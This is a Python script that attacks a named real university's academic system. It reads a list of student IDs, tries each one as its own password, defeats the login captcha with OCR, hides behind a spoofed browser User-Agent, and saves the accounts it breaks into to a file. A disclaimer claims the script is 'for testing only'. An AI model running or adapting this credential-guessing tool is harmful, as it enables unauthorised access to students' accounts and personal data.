#coding = utf-8
# by 'hollowman6' from Lanzhou University(兰州大学)

'''
警告：
仅供测试使用，不可用于任何非法用途！
对于使用本代码所造成的一切不良后果，本人将不负任何责任！

Warning:
For TESTING ONLY, not for any ILLIGAL USE!
I will not be responsible for any adverse consequences caused by using this code.

'''

# 图像处理 Image processing
from PIL import Image
# 文件处理 File processing
import io
# 正则表达式搜索 Regular expression search
import re
# 使能够在命令行下输入密码 Enable Entering a password at the command line
import getpass
# 爬虫库导入 Import Spider
import requests
# 识别验证码 Captcha Verification
import pytesseract
# 解析HTML界面 Parsing HTML Interface
from lxml import etree


class qdujw:
    def __init__(self):
        # 伪装爬虫 Camouflage Spider
        self.userid = 0
        self.s = requests.Session()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36'
        }

    # 教务系统登录 Login STU-INFO System
    def login(self):
        global sid, passwd
        # 页面相关设置 Page Related Settings
        loginurl = 'http://jwk.lzu.edu.cn/academic/j_acegi_security_check'
        codeurl = 'http://jwk.lzu.edu.cn/academic/getCaptcha.do'
        userurl = 'http://jwk.lzu.edu.cn/academic/showPersonalInfo.do'
        # 写入文件 Write file
        wf = open('new.txt', 'a')
        # 验证码 Captcha
        code = self.s.get(codeurl, headers=self.headers, stream=True)
        img = Image.open(io.BytesIO(code.content))

        # 验证码图片降噪 Captcha Image Denoising
        threshold = 140
        table = []
        for i in range(256):
            if i < threshold:
                table.append(0)
            else:
                table.append(1)

        # 将彩色图像转换为灰度图像 Converting color image to gray image
        imgry = img.convert('L')

        # 将图像中噪声去除 Noise Removal in Image
        out = imgry.point(table, '1')

        codetext = pytesseract.image_to_string(out, config='digits')

        # 去除空格，将.替换为0 Remove spaces and replace. with 0
        codetext = codetext.replace(' ', '')
        codetext = codetext.replace('.', '0')

        # 登录 Login
        postdata = {
            'j_username': sid,
            'j_password': passwd,
            'j_captcha': codetext
        }
        r = self.s.post(loginurl, postdata)

        # 验证码错误 Wrong Captcha
        if re.search(u'\u9a8c\u8bc1\u7801\u4e0d\u6b63\u786e', r.text):
            qdujw().login()

        # 验证码匹配成功 Captcha matched
        else:
            userpage = self.s.get(userurl).content
            name = etree.HTML(userpage.decode(
                'utf-8', 'ignore')).xpath('/html/body/center/table[1]/tr[1]/td[2]/text()')
            if str(name) == '[]':
                print(sid+"失败！")  # Fail
            else:
                print(str(name)+"成功！新增一条记录！")  # Success, new record
                wf.write(line)
        wf.close()


# 打开数据文件
f = open("list.txt")
# 测试学号和密码是否一样
line = f.readline()
while line:
    sid = line
    passwd = line
    try:
        qdujw().login()
    except Exception:
        pass
    line = f.readline()
f.close()
